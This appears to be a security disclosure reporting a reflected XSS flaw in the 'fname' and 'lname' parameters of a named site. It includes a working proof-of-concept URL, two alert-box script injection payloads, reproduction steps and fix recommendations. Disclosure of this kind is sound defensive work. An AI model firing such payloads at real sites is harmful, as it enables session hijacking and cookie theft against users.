# Reflected Cross-Site Scripting (XSS) via `fname` and `lname` Parameters

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability exists in the `fname` and `lname` parameters of the application. User-supplied input is reflected into the response without proper sanitization, allowing arbitrary JavaScript execution in the victim’s browser.

---

## Vulnerable Endpoint

```text id="a4v9qm"
http://kzlabs.com/3.php?fname=%22xicorr%3E%3CsCript%3Ealert%28%22xicorXSS1%22%29%3C%2FsCript%3E&lname=%22xicorr%3E%3CsCript%3Ealert%28%22xicorXSS2%22%29%3C%2FsCript%3E
```

---

## Vulnerable Parameters

```text id="t7x1nb"
fname
lname
```

---

## Payloads Used

```html id="m2q8zr"
"xicorr><sCript>alert("xicorXSS1")</sCript>
```

```html id="w5k3pd"
"xicorr><sCript>alert("xicorXSS2")</sCript>
```

---

## Steps to Reproduce

1. Open the following URL in a browser:

   ```text
   http://kzlabs.com/3.php?fname=%22xicorr%3E%3CsCript%3Ealert%28%22xicorXSS1%22%29%3C%2FsCript%3E&lname=%22xicorr%3E%3CsCript%3Ealert%28%22xicorXSS2%22%29%3C%2FsCript%3E
   ```

2. Observe that the payloads are reflected into the response.

3. JavaScript executes automatically and triggers popup dialogs.

---

## Proof of Concept

```text id="c8n4yh"
http://kzlabs.com/3.php?fname=%22xicorr%3E%3CsCript%3Ealert%28%22xicorXSS1%22%29%3C%2FsCript%3E&lname=%22xicorr%3E%3CsCript%3Ealert%28%22xicorXSS2%22%29%3C%2FsCript%3E
```

### Screenshot

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/3f8d1c9b-84e0-4d56-bd69-5822757dd7ab" />


<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/2a28d467-316e-451f-a267-d0f54c488804" />


---

## Impact

* Arbitrary JavaScript execution
* Session hijacking
* Cookie theft

---

## Recommendations for Fix

* Encode output before rendering
* Validate and sanitize user input
* Implement context-aware escaping
